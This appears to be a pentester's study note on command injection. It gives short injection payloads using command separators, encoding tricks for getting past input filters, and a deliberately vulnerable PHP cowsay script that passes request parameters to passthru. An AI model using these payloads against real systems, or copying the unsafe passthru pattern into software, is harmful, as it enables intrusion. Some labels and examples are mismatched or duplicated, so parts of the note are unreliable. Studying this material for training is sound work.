---
description: Can upload files revsre shell
---

# Command injection

The main defence for preventing injection attacks is ensuring that user-controlled input is not interpreted as queries or commands. There are different ways of doing this:

* Using an allow list: when input is sent to the server, this input is compared to a list of safe inputs or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected, and the application throws an error.
* Stripping input: If the input contains dangerous characters, these are removed before processing.

## Basic Command Injection

The simplest way is by inserting a command separator to chain additional commands. These are typical in Unix-based systems, but Windows has its own variations.

**Semicolon (`;`)**: Executes commands sequentially.

```bash
127.0.0.1; ls
```

**Semicolon (`;`)**: Executes commands sequentially.

```bash
127.0.0.1 && id
```

**Double pipe (`||`)**: Executes the second command only if the first one fails.

```bash
127.0.0.1 || id
```

**Pipe (`|`)**: Sends the output of one command as the input to the next.

```bash
127.0.0.1 | ls
```

## Bypassing Input Filters

**Base64 Encoding**: Some filters might not check for base64-encoded payloads.

```bash
echo "LS0gY2F0IC9ldGMvYXBwYWdlX2ZpbGU=" | base64 -d
```

**URL Encoding**: Certain characters might be URL-encoded (`%3B` for `;`, `%26` for `&`, `%7C` for `|`).

```bash
127.0.0.1%3B id
```

**Double URL Encoding**: Encode characters multiple times to bypass filters that decode only once.

```bash
127.0.0.1%253B id
```

**Hexadecimal Encoding**: Some filters don't properly decode hexadecimal characters.

```bash
127.0.0.1%3B id
```

{% embed url="https://www.youtube.com/watch?v=kiP12PrXOZA" %}

<figure><img src="../../../../../../../.gitbook/assets/9f657b909062ac82af12548b4f346aec.png" alt=""><figcaption></figcaption></figure>

```php
<?php
    if (isset($_GET["mooing"])) {
        $mooing = $_GET["mooing"];
        $cow = 'default';

        if(isset($_GET["cow"]))
            $cow = $_GET["cow"];
        
        passthru("perl /usr/bin/cowsay -f $cow $mooing");
    }
?>
```
